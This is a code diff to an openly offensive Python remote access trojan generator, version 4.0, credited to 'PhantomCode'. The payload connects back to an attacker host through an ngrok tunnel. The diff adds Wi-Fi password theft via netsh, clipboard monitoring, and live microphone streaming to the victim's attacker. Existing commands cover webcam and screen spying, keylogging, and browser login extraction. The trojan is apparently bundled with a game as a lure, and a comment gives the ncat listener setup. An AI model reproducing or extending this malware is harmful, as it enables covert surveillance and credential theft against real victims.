@@ -1,11 +1,21 @@
 
 import subprocess
 
+''''
+ngrok is require for IPs and port attacker, ngrok tcp 8080 needs to be this port, 
+there is Main.py file that is used to create a listener for webcam, screenshare and audio functions so the attacker use this command; default port is 8080
+libraries 
+
+ncat -lvnp 8080 for payload listener and for webcam ect.. needs to run the Main.py file for GUI
+
+pip install socket subprocess os time ctypes random pickle opencv-python pyaudio numpy pynput pywin32 threading struct pyautogui re json base64 pysqlite3 pycryptodomex
+tkinter random
+'''
 banner = """
     ==========================================
      Reverse Shell Generator Payload
      Created by: PhantomCode
-     Version: 3.6
+     Version: 4.0
     ==========================================
     """
 
@@ -16,7 +26,7 @@ e = "{e}"
 public_url = "{public_url}"
 web_cam = """{
     'webcam': 'Start webcam server',
-    'screenshot': 'Start screen sharing',
+    'screenshare': 'Start screen sharing',
     'upload': 'Start file upload server',
     'lockscreen': 'Lock target screen',
     'popups': 'annony the victim with popups',
@@ -24,13 +34,18 @@ web_cam = """{
     'reboot': 'reboot device',
     'extract_google_logins': 'extract_google_logins',
     'stop_webcam': 'stop camera',
-    'stop_screenshot': 'Stop screen sharing',
+    'stop_screenshare': 'Stop screen sharing',
     'help': 'help',
     'keylogs':'see the keys',
-    'start_keylogger':'start_keylogger'
+    'start_keylogger':'start_keylogger',
+    'get_wifi_passwords': 'get_wifi_passwords from target',
+    'get_clipboard_content': 'get_clipboard_content',
+    'audio_real_time': 'audio_real_time',
+    'stop_audio': 'stop_audio'
 
 }"""
 retry_interval = "{retry_interval}"
+wifi = "{wifi.strip()}"
 
 active_tunnel = "{active_tunnel.public_url}"
 file_name = "{file_name}"
@@ -42,6 +57,7 @@ password = "{password}"
 username = "{username}"
 seq1 = "{'*' * 50}"
 key = "{key}"
+pass3 = "{password.group(1)}"
 
 default_Script = f"""
 import socket
@@ -52,8 +68,10 @@ import ctypes
 import random  
 import pickle
 import cv2  
+import pyaudio
 import numpy as np
 from pynput.keyboard import Listener
+import win32clipboard
 import threading
 import struct
 import pyautogui
@@ -291,9 +309,118 @@ def clear_key_logs():
     global key_log
     key_log = []
 
+ATTACKER_IP = "{attacker_ip}"
+ATTACKER_PORT = {attacker_p}
+
+def get_wifi_passwords():
+    try:
+        profiles = subprocess.check_output("netsh wlan show profiles").decode()
+        wifi_list = re.findall(r"All User Profile\s*:\s*(.*)", profiles)
+        result = []
+        for wifi in wifi_list:
+            password_info = subprocess.check_output(f"netsh wlan show profile name=\\"{wifi}\\" key=clear").decode()
+            password = re.search(r"Key Content\s*:\s*(.*)", password_info)
+            if password:
+                result.append(f"WiFi: {wifi} - Password: {pass3}")
+            else:
+                result.append(f"WiFi: {wifi} - No password found")
+        return "\\n".join(result)
+    except Exception as e:
+        return f"Failed to retrieve Wi-Fi passwords: {e}"
+
+
+clipboard_history = []
+
+def monitor_clipboard():
+    last_data = None
+    while True:
+        try:
+            win32clipboard.OpenClipboard()
+            clipboard_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            # If the clipboard content has changed, add it to history
+            if clipboard_data != last_data:
+                clipboard_history.append(clipboard_data)
+                last_data = clipboard_data
+        except Exception:
+            pass
+
+        # Delay before checking again
+        time.sleep(2)
+
+def get_clipboard_content():
+    if clipboard_history:
+        return "\\n".join(clipboard_history)
+    else:
+        return "No clipboard data available."
+
+clipboard_thread = None
+
+server_ip = ATTACKER_IP
+server_port = ATTACKER_PORT
+
+chunk_size = 1024
+audio_format = pyaudio.paInt16
+channels = 1
+rate = 44100
+
+stop_audio_streaming = threading.Event()
+
+# Global variable for controlling audio streaming
+audio_streaming = True
+audio_thread = None
+
+
+def stream_audio_to_server():
+    p = pyaudio.PyAudio()
+    
+    # Initialize the audio stream
+    stream = p.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk_size)
+    
+    client_socket = None
+    while audio_streaming:
+        try:
+            if client_socket is None:
+                # Attempt to connect to the server
+                print("Trying to connect to server...")
+                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client_socket.connect((server_ip, server_port))
+                print("Connected to server.")
+            
+            while audio_streaming and not stop_audio_streaming.is_set():
+                # Read audio chunk from microphone
+                data = stream.read(chunk_size)
+
+                # Send data size first
+                client_socket.sendall(struct.pack("L", len(data)))
+
+                # Send audio data
+                client_socket.sendall(data)
+        except socket.error as e:
+            print(f"Connection error: {e}")
+            client_socket = None
+            time.sleep(1)  # Retry after 1 seconds if connection fails
+        except Exception as e:
+            print(f"Streaming error: {e}")
+            break
+    
+    # Cleanup after stopping the stream
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+    if client_socket:
+        client_socket.close()
+
 def reverse_shell():
-    ATTACKER_IP = "{attacker_ip}"
-    ATTACKER_PORT = {attacker_p}
+
+    global clipboard_thread
+
+    # Start the clipboard monitoring thread
+    if clipboard_thread is None:
+        clipboard_thread = threading.Thread(target=monitor_clipboard)
+        clipboard_thread.daemon = True  # This ensures the thread will stop when the program exits
+        clipboard_thread.start()
 
     while True:
         try:
@@ -309,8 +436,8 @@ def reverse_shell():
  | |    | |__| ||  __/| |__| |
  |_|     \_____(_)___||_____/  Payload Generator - Enemies Destroyed 
 
- -v:3.5
- created by G@briel_H@cker
+ -v:4.0
+ created by PhantomCode
 
  type 'help' to see all cammands
                               
@@ -344,6 +471,44 @@ def reverse_shell():
                         else:
                             client.send(b"[INFO] Webcam stream is not running.")
 
+                    elif command.lower() == "audio_real_time":
+                        if not audio_streaming:
+                            # Start the audio streaming in a separate thread
+                            audio_streaming = True
+                            stop_audio_streaming.clear()  # Ensure the stop event is not set
+                            audio_thread = threading.Thread(target=stream_audio_to_server)
+                            audio_thread.daemon = True  # Ensure thread exits when the main program does
+                            audio_thread.start()
+                            print("Audio streaming started.")
+                        else:
+                            print("Audio streaming is already running.")
+                            
+                    elif command.lower() == "stop_audio":
+                        if audio_streaming:
+                            # Stop the audio streaming
+                            audio_streaming = False
+                            stop_audio_streaming.set()  # Signal the audio thread to stop
+                            
+                            print("Audio streaming stopped.")
+                        else:
+                            print("Audio streaming is not running.")
+
+                    elif command.lower() == 'get_wifi_passwords':
+                        try:
+                            wifi_passwords = get_wifi_passwords()
+                            banner = b'''
+                            ##############################
+                            #      Wi-Fi Passwords       #
+                            ##############################
+                            '''
+                            client.send(color + banner)
+                            client.send(b"\\n\\n")
+                            client.send(wifi_passwords.encode())  
+                        except Exception as e:
+                            print(f"Failed to send data: {e}")
+                        except Exception as e:
+                            client.send(f"Failed to retrieve Wi-Fi passwords: {e}".encode())
+
                     elif command == "help":
                         help = b'''
             
@@ -353,7 +518,7 @@ def reverse_shell():
 
             webcam: see the victim real-time camera. but to open the cv2 GUI need to run the Main.py file
 
-            screenshot: see the victim real-time screen.but to open the cv2 GUI need to run the Main.py file
+            screenshare: see the victim real-time screen.but to open the cv2 GUI need to run the Main.py file
 
             lockscreen: type and the target screen will be locked!
 
@@ -366,16 +531,32 @@ def reverse_shell():
 
             extract_google_logins : extract_google_logins like passwords and usernames
 
-            stop_screenshot: will stop screen-sharing
+            stop_screenshare: will stop screen-sharing
             stop_webcam: will stop webcam-sharing
             keylogs: see the keys
             start_keylogger: start_keylogger to get the keys.
+            get_wifi_passwords: get wifi credentials
+
+            get_clipboard_content : see what the victim has in it clipboard.
+            audio_real_time: hear real time what victim says.
+            stop_audio : stop_audio real time
 
             '''        
                         client.send(help)        
 
                     elif command == "shutdown":
                        shutdown_device()
+
+                    elif command.lower() == 'get_clipboard_content':
+                        banner = b'''
+                            ##############################
+                            #      clipboard data        #
+                            ##############################
+                            '''
+                        client.send(color + banner)
+                        client.send(b"\\n\\n")
+                        clipboard_data = get_clipboard_content()
+                        client.send(clipboard_data.encode())
 
                     elif command.lower() == 'keylogs':
                         logs = get_key_logs()
@@ -405,7 +586,7 @@ def reverse_shell():
                             message = f"URL: {url}\\n User Name: {username}\\n Password: {password}\\n{seq1}\\n"
                             client.send(message.encode('utf-8'))
 
-                    elif command.lower() == 'screenshot':
+                    elif command.lower() == 'screenshare':
                         if screenshot_thread is None or not screenshot_thread.is_alive():
                             client.send(b"[INFO] Starting screen sharing...")
                             stop_webcam_streaming.clear()  # Ensure the stop flag is not set
@@ -414,7 +595,7 @@ def reverse_shell():
                         else:
                             client.send(b"[INFO] Screen sharing is already running.")
 
-                    elif command.lower() == 'stop_screenshot':
+                    elif command.lower() == 'stop_screenshare':
                         if screenshot_thread and screenshot_thread.is_alive():
                             client.send(b"[INFO] Stopping screen sharing...")
                             stop_webcam_streaming.set()  # Signal the screen sharing thread to stop
@@ -453,16 +634,22 @@ def reverse_shell():
         except ConnectionResetError:
             print("[ERROR] Connection reset by peer.")
             stop_webcam_streaming.set()
+            audio_streaming = False
+            stop_audio_streaming.set()
             stop_screenshot_streaming.set()
         except Exception as e:
             print(f"Connection lost: {e}")
             stop_webcam_streaming.set()
+            audio_streaming = False
+            stop_audio_streaming.set()
             stop_screenshot_streaming.set()
             time.sleep(2)
         finally:
             client.close()
             webcam_thread = None
             screenshot_thread = None
+            clipboard_thread = None
+            audio_streaming = None
 
 
 if __name__ == "__main__":
@@ -479,19 +666,21 @@ import ctypes
 import random  
 import pickle
 import cv2  
+import pyaudio
 import numpy as np
+from pynput.keyboard import Listener
+import win32clipboard
 import threading
 import struct
 import pyautogui
 import re
 import json
 import base64
-from pynput.keyboard import Listener
 import sqlite3
 import win32crypt
-from Game import main
 from Cryptodome.Cipher import AES
 import shutil
+from Game import main
 
 
 # Define custom commands
@@ -696,10 +885,8 @@ def stream_screenshot_to_server(server_ip, server_port, retry_interval=1):
             client_socket.close()
             if stop_webcam_streaming.is_set():
                 break
-def open_game():
-    main()
 
-    
+                
 key_log = []
 
 def on_press(key):
@@ -721,9 +908,121 @@ def clear_key_logs():
     global key_log
     key_log = []
 
+ATTACKER_IP = "{attacker_ip}"
+ATTACKER_PORT = {attacker_p}
+
+def get_wifi_passwords():
+    try:
+        profiles = subprocess.check_output("netsh wlan show profiles").decode()
+        wifi_list = re.findall(r"All User Profile\s*:\s*(.*)", profiles)
+        result = []
+        for wifi in wifi_list:
+            password_info = subprocess.check_output(f"netsh wlan show profile name=\\"{wifi}\\" key=clear").decode()
+            password = re.search(r"Key Content\s*:\s*(.*)", password_info)
+            if password:
+                result.append(f"WiFi: {wifi} - Password: {pass3}")
+            else:
+                result.append(f"WiFi: {wifi} - No password found")
+        return "\\n".join(result)
+    except Exception as e:
+        return f"Failed to retrieve Wi-Fi passwords: {e}"
+
+
+clipboard_history = []
+
+def monitor_clipboard():
+    last_data = None
+    while True:
+        try:
+            win32clipboard.OpenClipboard()
+            clipboard_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            # If the clipboard content has changed, add it to history
+            if clipboard_data != last_data:
+                clipboard_history.append(clipboard_data)
+                last_data = clipboard_data
+        except Exception:
+            pass
+
+        # Delay before checking again
+        time.sleep(2)
+
+def get_clipboard_content():
+    if clipboard_history:
+        return "\\n".join(clipboard_history)
+    else:
+        return "No clipboard data available."
+
+clipboard_thread = None
+
+server_ip = ATTACKER_IP
+server_port = ATTACKER_PORT
+
+chunk_size = 1024
+audio_format = pyaudio.paInt16
+channels = 1
+rate = 44100
+
+stop_audio_streaming = threading.Event()
+
+# Global variable for controlling audio streaming
+audio_streaming = True
+audio_thread = None
+
+
+def stream_audio_to_server():
+    p = pyaudio.PyAudio()
+    
+    # Initialize the audio stream
+    stream = p.open(format=audio_format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk_size)
+    
+    client_socket = None
+    while audio_streaming:
+        try:
+            if client_socket is None:
+                # Attempt to connect to the server
+                print("Trying to connect to server...")
+                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                client_socket.connect((server_ip, server_port))
+                print("Connected to server.")
+            
+            while audio_streaming and not stop_audio_streaming.is_set():
+                # Read audio chunk from microphone
+                data = stream.read(chunk_size)
+
+                # Send data size first
+                client_socket.sendall(struct.pack("L", len(data)))
+
+                # Send audio data
+                client_socket.sendall(data)
+        except socket.error as e:
+            print(f"Connection error: {e}")
+            client_socket = None
+            time.sleep(1)  # Retry after 1 seconds if connection fails
+        except Exception as e:
+            print(f"Streaming error: {e}")
+            break
+    
+    # Cleanup after stopping the stream
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+    if client_socket:
+        client_socket.close()
+
+def open_game():
+    main()
+
 def reverse_shell():
-    ATTACKER_IP = "{attacker_ip}"
-    ATTACKER_PORT = {attacker_p}
+
+    global clipboard_thread
+
+    # Start the clipboard monitoring thread
+    if clipboard_thread is None:
+        clipboard_thread = threading.Thread(target=monitor_clipboard)
+        clipboard_thread.daemon = True  # This ensures the thread will stop when the program exits
+        clipboard_thread.start()
 
     while True:
         try:
@@ -737,12 +1036,13 @@ def reverse_shell():
  | |__) | |  __   ___ | |  | |
  |  ___/| | |_ | / _ \| |  | |
  | |    | |__| ||  __/| |__| |
- |_|     \_____(_)___||_____/  Payload Generator - Enemies Destroyed
+ |_|     \_____(_)___||_____/  Payload Generator - Enemies Destroyed 
 
- -v:3.5
- created by G@briel_H@cker                              
+ -v:4.0
+ created by PhantomCode
 
-type 'help' to see all cammands
+ type 'help' to see all cammands
+                              
 
             '''
  
@@ -762,7 +1062,6 @@ type 'help' to see all cammands
                             client.send(b"[INFO] Starting webcam stream...")
                             webcam_thread = threading.Thread(target=stream_webcam_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                             webcam_thread.start()
-                            client.send(b"if close open the listener again, then run the command again and run the Main.py file to see the screen")
                         else:
                             client.send(b"[INFO] Webcam stream is already running.")
 
@@ -774,14 +1073,43 @@ type 'help' to see all cammands
                         else:
                             client.send(b"[INFO] Webcam stream is not running.")
 
-                    elif command.lower() == 'keylogs':
-                        logs = get_key_logs()
-                        client.send(logs.encode('utf-8'))
-                        clear_key_logs()
+                    elif command.lower() == "audio_real_time":
+                        if not audio_streaming:
+                            # Start the audio streaming in a separate thread
+                            audio_streaming = True
+                            stop_audio_streaming.clear()  # Ensure the stop event is not set
+                            audio_thread = threading.Thread(target=stream_audio_to_server)
+                            audio_thread.daemon = True  # Ensure thread exits when the main program does
+                            audio_thread.start()
+                            print("Audio streaming started.")
+                        else:
+                            print("Audio streaming is already running.")
+                            
+                    elif command.lower() == "stop_audio":
+                        if audio_streaming:
+                            # Stop the audio streaming
+                            audio_streaming = False
+                            stop_audio_streaming.set()  # Signal the audio thread to stop
+                            
+                            print("Audio streaming stopped.")
+                        else:
+                            print("Audio streaming is not running.")
 
-                    elif command.lower() == 'start_keylogger':
-                        client.send(b"Starting keylogger...")
-                        threading.Thread(target=start_keylogger).start()
+                    elif command.lower() == 'get_wifi_passwords':
+                        try:
+                            wifi_passwords = get_wifi_passwords()
+                            banner = b'''
+                            ##############################
+                            #      Wi-Fi Passwords       #
+                            ##############################
+                            '''
+                            client.send(color + banner)
+                            client.send(b"\\n\\n")
+                            client.send(wifi_passwords.encode())  
+                        except Exception as e:
+                            print(f"Failed to send data: {e}")
+                        except Exception as e:
+                            client.send(f"Failed to retrieve Wi-Fi passwords: {e}".encode())
 
                     elif command == "help":
                         help = b'''
@@ -792,7 +1120,7 @@ type 'help' to see all cammands
 
             webcam: see the victim real-time camera. but to open the cv2 GUI need to run the Main.py file
 
-            screenshot: see the victim real-time screen.but to open the cv2 GUI need to run the Main.py file
+            screenshare: see the victim real-time screen.but to open the cv2 GUI need to run the Main.py file
 
             lockscreen: type and the target screen will be locked!
 
@@ -805,17 +1133,41 @@ type 'help' to see all cammands
 
             extract_google_logins : extract_google_logins like passwords and usernames
 
-            stop_screenshot: will stop screen-sharing
+            stop_screenshare: will stop screen-sharing
             stop_webcam: will stop webcam-sharing
             keylogs: see the keys
             start_keylogger: start_keylogger to get the keys.
+            get_wifi_passwords: get wifi credentials
 
+            get_clipboard_content : see what the victim has in it clipboard.
+            audio_real_time: hear real time what victim says.
+            stop_audio : stop_audio real time
 
             '''        
-                        client.send(help)
+                        client.send(help)        
 
                     elif command == "shutdown":
                        shutdown_device()
+
+                    elif command.lower() == 'get_clipboard_content':
+                        banner = b'''
+                            ##############################
+                            #      clipboard data        #
+                            ##############################
+                            '''
+                        client.send(color + banner)
+                        client.send(b"\\n\\n")
+                        clipboard_data = get_clipboard_content()
+                        client.send(clipboard_data.encode())
+
+                    elif command.lower() == 'keylogs':
+                        logs = get_key_logs()
+                        client.send(logs.encode('utf-8'))
+                        clear_key_logs()
+
+                    elif command.lower() == 'start_keylogger':
+                        client.send(b"Starting keylogger...")
+                        threading.Thread(target=start_keylogger).start()
 
                     elif command == "reboot":
                         reboot_device()
@@ -836,17 +1188,16 @@ type 'help' to see all cammands
                             message = f"URL: {url}\\n User Name: {username}\\n Password: {password}\\n{seq1}\\n"
                             client.send(message.encode('utf-8'))
 
-                    elif command.lower() == 'screenshot':
+                    elif command.lower() == 'screenshare':
                         if screenshot_thread is None or not screenshot_thread.is_alive():
                             client.send(b"[INFO] Starting screen sharing...")
                             stop_webcam_streaming.clear()  # Ensure the stop flag is not set
                             screenshot_thread = threading.Thread(target=stream_screenshot_to_server, args=(ATTACKER_IP, ATTACKER_PORT))
                             screenshot_thread.start()
-                            client.send(b"if close open the listener again, then run the command again and run the Main.py file to see the screen")
                         else:
                             client.send(b"[INFO] Screen sharing is already running.")
 
-                    elif command.lower() == 'stop_screenshot':
+                    elif command.lower() == 'stop_screenshare':
                         if screenshot_thread and screenshot_thread.is_alive():
                             client.send(b"[INFO] Stopping screen sharing...")
                             stop_webcam_streaming.set()  # Signal the screen sharing thread to stop
@@ -885,16 +1236,22 @@ type 'help' to see all cammands
         except ConnectionResetError:
             print("[ERROR] Connection reset by peer.")
             stop_webcam_streaming.set()
+            audio_streaming = False
+            stop_audio_streaming.set()
             stop_screenshot_streaming.set()
         except Exception as e:
             print(f"Connection lost: {e}")
             stop_webcam_streaming.set()
+            audio_streaming = False
+            stop_audio_streaming.set()
             stop_screenshot_streaming.set()
             time.sleep(2)
         finally:
             client.close()
             webcam_thread = None
             screenshot_thread = None
+            clipboard_thread = None
+            audio_streaming = None
 
 
 if __name__ == "__main__":
